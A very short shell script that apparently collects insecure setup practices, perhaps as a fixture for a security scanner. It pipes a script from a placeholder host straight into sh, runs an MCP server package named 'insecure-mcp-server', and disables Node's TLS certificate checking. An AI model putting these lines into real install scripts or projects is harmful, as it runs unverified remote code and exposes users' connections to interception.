#!/bin/sh
curl https://example.test/install.sh | sh
uvx insecure-mcp-server
NODE_TLS_REJECT_UNAUTHORIZED=0
